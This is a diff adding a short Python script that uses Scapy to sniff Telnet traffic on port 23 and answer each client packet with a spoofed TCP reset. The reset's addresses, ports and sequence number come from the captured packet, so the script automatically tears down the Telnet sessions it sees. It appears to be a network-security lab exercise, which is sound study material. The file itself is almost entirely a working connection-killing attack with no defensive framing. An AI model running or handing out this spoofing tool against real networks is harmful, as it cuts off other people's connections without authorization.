@@ -1,0 +1,30 @@
+# Automated sniff and spoof to reset and disconnection the telnet connection 
+#!/usr/bin/python3
+from scapy.all import sniff, IP, TCP, send
+
+# Define the sniffing filter (Telnet traffic on port 23)
+def sniff_and_rst(packet):
+    if packet.haslayer(TCP) and packet[TCP].dport == 23:
+        print(f"Sniffed a Telnet packet: {packet.summary()}")
+
+        # Extract necessary details from the sniffed packet
+        src_ip = packet[IP].dst  # Source IP for spoofed packet (destination in sniffed packet)
+        dst_ip = packet[IP].src  # Destination IP for spoofed packet (source in sniffed packet)
+        sport = packet[TCP].dport  # Source port for spoofed packet (destination port in sniffed packet)
+        dport = packet[TCP].sport  # Destination port for spoofed packet (source port in sniffed packet)
+        seq = packet[TCP].ack  # Use the acknowledgment number as the sequence number
+
+        print(f"Creating TCP RST packet: src={src_ip}, dst={dst_ip}, sport={sport}, dport={dport}, seq={seq}")
+
+        # Construct the spoofed TCP RST packet
+        ip = IP(src=src_ip, dst=dst_ip)
+        tcp = TCP(sport=sport, dport=dport, seq=seq, flags="R")
+        rst_packet = ip / tcp
+
+        # Send the spoofed RST packet
+        send(rst_packet, verbose=0)
+        print("Spoofed TCP RST packet sent!")
+
+# Sniff Telnet traffic and process packets dynamically
+print("Sniffing Telnet traffic... Press Ctrl+C to stop.")
+sniff(filter="tcp port 23", prn=sniff_and_rst, iface="eth0")  # Replace "eth0" with your network interface name
